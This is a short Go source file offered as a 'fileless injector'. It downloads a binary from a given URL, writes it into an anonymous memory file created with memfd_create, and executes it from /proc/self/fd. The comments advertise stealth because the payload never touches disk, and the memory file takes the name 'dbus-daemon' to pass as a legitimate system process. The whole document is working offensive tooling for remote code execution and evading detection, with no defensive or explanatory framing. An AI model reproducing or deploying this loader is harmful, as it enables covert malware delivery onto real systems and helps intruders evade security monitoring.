// Linux Fileless Injector (Download and Run in RAM)
// This tool downloads a binary and executes it directly from memory using memfd_create.
// Stealth: It never touches the disk.

package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"os/exec"

	"golang.org/x/sys/unix"
)

func main() {
	if len(os.Args) < 2 {
		fmt.Println("Usage: ./injector <url_du_binaire>")
		os.Exit(1)
	}

	url := os.Args[1]
	fmt.Printf("[*] Downloading payload from: %s\n", url)

	// 1. Download the binary
	resp, err := http.Get(url)
	if err != nil {
		fmt.Printf("[!] Error downloading: %v\n", err)
		os.Exit(1)
	}
	defer resp.Body.Close()

	payload, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Printf("[!] Error reading payload: %v\n", err)
		os.Exit(1)
	}

	// 2. Create an anonymous file in RAM
	// memfd_create(name, flags)
	fd, err := unix.MemfdCreate("dbus-daemon", 0)
	if err != nil {
		fmt.Printf("[!] memfd_create failed: %v\n", err)
		os.Exit(1)
	}

	// 3. Write payload to the memory file
	mFile := os.NewFile(uintptr(fd), "memfd")
	_, err = mFile.Write(payload)
	if err != nil {
		fmt.Printf("[!] Error writing to memfd: %v\n", err)
		os.Exit(1)
	}

	// 4. Execute the binary from memory
	// We use /proc/self/fd/<fd> to execute it
	path := fmt.Sprintf("/proc/self/fd/%d", fd)
	fmt.Printf("[*] Executing fileless payload from RAM...\n")
	
	cmd := exec.Command(path)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	err = cmd.Run()
	if err != nil {
		fmt.Printf("[!] Execution failed: %v\n", err)
	}
}
